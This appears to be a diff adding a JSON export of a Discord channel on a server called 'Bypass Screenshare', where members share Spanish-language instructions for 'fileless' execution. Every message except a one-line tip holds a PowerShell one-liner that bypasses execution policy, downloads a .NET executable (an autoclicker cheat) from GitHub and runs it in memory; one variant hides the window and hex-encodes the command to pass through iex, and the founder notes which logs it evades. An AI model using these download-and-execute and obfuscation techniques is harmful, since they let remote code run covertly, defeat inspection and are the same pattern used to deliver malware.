@@ -1,0 +1,460 @@
+{
+  "guild": {
+    "id": "1385680731212218449",
+    "name": "Bypass Screenshare",
+    "iconUrl": "https://cdn.discordapp.com/icons/1385680731212218449/3be219b22eb8a5390cc8b0c1c31cf0c6.png?size=512"
+  },
+  "channel": {
+    "id": "1485687377392566485",
+    "type": "GuildTextChat",
+    "categoryId": "1461571659453563052",
+    "category": "metodos avanzados",
+    "name": "»「\uD83D\uDCC4」make-fileless",
+    "topic": null
+  },
+  "dateRange": {
+    "after": null,
+    "before": null
+  },
+  "exportedAt": "2026-06-17T21:15:28.0302957-03:00",
+  "messages": [
+    {
+      "id": "1485688149165346877",
+      "type": "Default",
+      "timestamp": "2026-03-23T14:14:17.512-03:00",
+      "timestampEdited": "2026-03-23T14:39:01.956-03:00",
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "bueno este metodo les  va a servir para crear sus propios comandos fileless y es bastante facil, aca tienen la base del comando\n\npowershell -nop -ep bypass -c \"try { $bytes = (New-Object Net.WebClient).DownloadData('https://github.com/ccsgoq-byte/asdsa/raw/main/Sapphire_Clicker%20(OUTDATED%20LEAK).exe'); $asm = [Reflection.Assembly]::Load($bytes); $entry = $asm.EntryPoint; $entry.Invoke($null, $null) } catch { $_.Exception | Format-List -Force; pause }\"\n\nlo unico que tienen que hacer es subir su autoclicker a github y cambiar el enlace raw\n\nlos requisitos para que el fileless funcione son: que sea .exe y que sea .net\n\nbypasean consolehost_history pero no bypasean eventvwr, asi que les recomiendo juntarlo con #»「\uD83E\uDDE9」fileless-obfuscator #»「\uD83D\uDD76️」fileless \n\naca tienen otro comando de ejemplo:\n\npowershell -nop -ep bypass -c \"try { $bytes = (New-Object Net.WebClient).DownloadData('https://github.com/ccsgoq-byte/asdash/raw/main/engouranceCS%20v1.3.exe'); $asm = [Reflection.Assembly]::Load($bytes); $entry = $asm.EntryPoint; $entry.Invoke($null, $null) } catch { $_.Exception | Format-List -Force; pause }\"",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [
+        {
+          "emoji": {
+            "id": "",
+            "name": "✅",
+            "code": "white_check_mark",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/2705.svg"
+          },
+          "count": 3,
+          "users": [
+            {
+              "id": "834270448598253568",
+              "name": ".hy_x1",
+              "discriminator": "0000",
+              "nickname": "♡ Hyx",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/834270448598253568/af652bf1c2f1f3b666a4ca6d9c754312.png?size=512"
+            },
+            {
+              "id": "1325712533633630309",
+              "name": "streaky_",
+              "discriminator": "0000",
+              "nickname": "♱",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1325712533633630309/7bc3db982202dde546a52c03415297f1.png?size=512"
+            },
+            {
+              "id": "1438951996626305034",
+              "name": "hilebaz",
+              "discriminator": "0000",
+              "nickname": "☨       hilebaz",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1438951996626305034/2ee08200ff74628cdfe5004ad0629f1d.png?size=512"
+            }
+          ]
+        }
+      ],
+      "mentions": [],
+      "inlineEmojis": []
+    },
+    {
+      "id": "1485688900583424041",
+      "type": "Default",
+      "timestamp": "2026-03-23T14:17:16.664-03:00",
+      "timestampEdited": null,
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "(los comandos van en cmd)",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    },
+    {
+      "id": "1485694257359618048",
+      "type": "Default",
+      "timestamp": "2026-03-23T14:38:33.819-03:00",
+      "timestampEdited": "2026-03-23T14:39:08.002-03:00",
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "$bytes = (New-Object System.Net.WebClient).DownloadData('https://github.com/ccsgoq-byte/asdsa/raw/main/Sapphire_Clicker%20(OUTDATED%20LEAK).exe'); [System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, $null) # password",
+      "author": {
+        "id": "1322533714277961791",
+        "name": "solary67",
+        "discriminator": "0000",
+        "nickname": "Slinky",
+        "color": "#FF0000",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1498119439961559170",
+            "name": "inbaneable",
+            "color": null,
+            "position": 33
+          },
+          {
+            "id": "1449322432199524383",
+            "name": "CEO",
+            "color": "#FF0000",
+            "position": 30
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1322533714277961791/e4a449565e1a84b2a477c01a8f21d0ee.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [
+        {
+          "emoji": {
+            "id": "",
+            "name": "✅",
+            "code": "white_check_mark",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/2705.svg"
+          },
+          "count": 2,
+          "users": [
+            {
+              "id": "834270448598253568",
+              "name": ".hy_x1",
+              "discriminator": "0000",
+              "nickname": "♡ Hyx",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/834270448598253568/af652bf1c2f1f3b666a4ca6d9c754312.png?size=512"
+            },
+            {
+              "id": "1325712533633630309",
+              "name": "streaky_",
+              "discriminator": "0000",
+              "nickname": "♱",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1325712533633630309/7bc3db982202dde546a52c03415297f1.png?size=512"
+            }
+          ]
+        }
+      ],
+      "mentions": [],
+      "inlineEmojis": []
+    },
+    {
+      "id": "1485837697686962177",
+      "type": "Default",
+      "timestamp": "2026-03-24T00:08:32.658-03:00",
+      "timestampEdited": null,
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "powershell -w hidden -nop -ep bypass -c \"$s='74-72-79-20-7B-20-24-62-79-74-65-73-20-3D-20-28-4E-65-77-2D-4F-62-6A-65-63-74-20-4E-65-74-2E-57-65-62-43-6C-69-65-6E-74-29-2E-44-6F-77-6E-6C-6F-61-64-44-61-74-61-28-27-68-74-74-70-73-3A-2F-2F-67-69-74-68-75-62-2E-63-6F-6D-2F-63-63-73-67-6F-71-2D-62-79-74-65-2F-61-73-64-73-61-2F-72-61-77-2F-6D-61-69-6E-2F-53-61-70-70-68-69-72-65-5F-43-6C-69-63-6B-65-72-25-32-30-28-4F-55-54-44-41-54-45-44-25-32-30-4C-45-41-4B-29-2E-65-78-65-27-29-3B-20-24-61-73-6D-20-3D-20-5B-52-65-66-6C-65-63-74-69-6F-6E-2E-41-73-73-65-6D-62-6C-79-5D-3A-3A-4C-6F-61-64-28-24-62-79-74-65-73-29-3B-20-24-65-6E-74-72-79-20-3D-20-24-61-73-6D-2E-45-6E-74-72-79-50-6F-69-6E-74-3B-20-24-65-6E-74-72-79-2E-49-6E-76-6F-6B-65-28-24-6E-75-6C-6C-2C-20-24-6E-75-6C-6C-29-20-7D-20-63-61-74-63-68-20-7B-20-24-5F-2E-45-78-63-65-70-74-69-6F-6E-20-7C-20-46-6F-72-6D-61-74-2D-4C-69-73-74-20-2D-46-6F-72-63-65-3B-20-70-61-75-73-65-20-7D';iex(-join($s-split'-'|%{[char][convert]::ToInt32($_,16)}))\"",
+      "author": {
+        "id": "1325712533633630309",
+        "name": "streaky_",
+        "discriminator": "0000",
+        "nickname": "♱",
+        "color": "#2C6D2C",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1485053790242476102",
+            "name": "Verified",
+            "color": "#2C6D2C",
+            "position": 2
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1325712533633630309/7bc3db982202dde546a52c03415297f1.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [
+        {
+          "emoji": {
+            "id": "",
+            "name": "\uD83C\uDDED",
+            "code": "regional_indicator_h",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/1f1ed.svg"
+          },
+          "count": 1,
+          "users": [
+            {
+              "id": "1018577553583263804",
+              "name": "mcvitiesbiscuit",
+              "discriminator": "0000",
+              "nickname": "QuickPots",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1018577553583263804/b61c27b3178b3205d8e206f637db2d67.png?size=512"
+            }
+          ]
+        },
+        {
+          "emoji": {
+            "id": "",
+            "name": "\uD83C\uDDEE",
+            "code": "regional_indicator_i",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/1f1ee.svg"
+          },
+          "count": 1,
+          "users": [
+            {
+              "id": "1018577553583263804",
+              "name": "mcvitiesbiscuit",
+              "discriminator": "0000",
+              "nickname": "QuickPots",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1018577553583263804/b61c27b3178b3205d8e206f637db2d67.png?size=512"
+            }
+          ]
+        },
+        {
+          "emoji": {
+            "id": "",
+            "name": "\uD83C\uDDEF",
+            "code": "regional_indicator_j",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/1f1ef.svg"
+          },
+          "count": 1,
+          "users": [
+            {
+              "id": "1018577553583263804",
+              "name": "mcvitiesbiscuit",
+              "discriminator": "0000",
+              "nickname": "QuickPots",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1018577553583263804/b61c27b3178b3205d8e206f637db2d67.png?size=512"
+            }
+          ]
+        },
+        {
+          "emoji": {
+            "id": "",
+            "name": "\uD83C\uDDF4",
+            "code": "regional_indicator_o",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/1f1f4.svg"
+          },
+          "count": 1,
+          "users": [
+            {
+              "id": "1018577553583263804",
+              "name": "mcvitiesbiscuit",
+              "discriminator": "0000",
+              "nickname": "QuickPots",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1018577553583263804/b61c27b3178b3205d8e206f637db2d67.png?size=512"
+            }
+          ]
+        },
+        {
+          "emoji": {
+            "id": "",
+            "name": "\uD83C\uDDE9",
+            "code": "regional_indicator_d",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/1f1e9.svg"
+          },
+          "count": 1,
+          "users": [
+            {
+              "id": "1018577553583263804",
+              "name": "mcvitiesbiscuit",
+              "discriminator": "0000",
+              "nickname": "QuickPots",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1018577553583263804/b61c27b3178b3205d8e206f637db2d67.png?size=512"
+            }
+          ]
+        },
+        {
+          "emoji": {
+            "id": "",
+            "name": "\uD83C\uDDEA",
+            "code": "regional_indicator_e",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/1f1ea.svg"
+          },
+          "count": 1,
+          "users": [
+            {
+              "id": "1018577553583263804",
+              "name": "mcvitiesbiscuit",
+              "discriminator": "0000",
+              "nickname": "QuickPots",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1018577553583263804/b61c27b3178b3205d8e206f637db2d67.png?size=512"
+            }
+          ]
+        },
+        {
+          "emoji": {
+            "id": "",
+            "name": "\uD83C\uDDF5",
+            "code": "regional_indicator_p",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/1f1f5.svg"
+          },
+          "count": 1,
+          "users": [
+            {
+              "id": "1018577553583263804",
+              "name": "mcvitiesbiscuit",
+              "discriminator": "0000",
+              "nickname": "QuickPots",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1018577553583263804/b61c27b3178b3205d8e206f637db2d67.png?size=512"
+            }
+          ]
+        },
+        {
+          "emoji": {
+            "id": "",
+            "name": "\uD83C\uDDFA",
+            "code": "regional_indicator_u",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/1f1fa.svg"
+          },
+          "count": 1,
+          "users": [
+            {
+              "id": "1018577553583263804",
+              "name": "mcvitiesbiscuit",
+              "discriminator": "0000",
+              "nickname": "QuickPots",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1018577553583263804/b61c27b3178b3205d8e206f637db2d67.png?size=512"
+            }
+          ]
+        },
+        {
+          "emoji": {
+            "id": "",
+            "name": "\uD83C\uDDF9",
+            "code": "regional_indicator_t",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/1f1f9.svg"
+          },
+          "count": 1,
+          "users": [
+            {
+              "id": "1018577553583263804",
+              "name": "mcvitiesbiscuit",
+              "discriminator": "0000",
+              "nickname": "QuickPots",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1018577553583263804/b61c27b3178b3205d8e206f637db2d67.png?size=512"
+            }
+          ]
+        },
+        {
+          "emoji": {
+            "id": "",
+            "name": "\uD83C\uDDE6",
+            "code": "regional_indicator_a",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/1f1e6.svg"
+          },
+          "count": 1,
+          "users": [
+            {
+              "id": "1018577553583263804",
+              "name": "mcvitiesbiscuit",
+              "discriminator": "0000",
+              "nickname": "QuickPots",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1018577553583263804/b61c27b3178b3205d8e206f637db2d67.png?size=512"
+            }
+          ]
+        },
+        {
+          "emoji": {
+            "id": "",
+            "name": "✅",
+            "code": "white_check_mark",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/2705.svg"
+          },
+          "count": 1,
+          "users": [
+            {
+              "id": "792472299148279859",
+              "name": "almazi",
+              "discriminator": "0000",
+              "nickname": "mad",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/792472299148279859/42b1d1e3f4286c061cb3ea13713605f8.png?size=512"
+            }
+          ]
+        }
+      ],
+      "mentions": [],
+      "inlineEmojis": []
+    }
+  ],
+  "messageCount": 4
+}
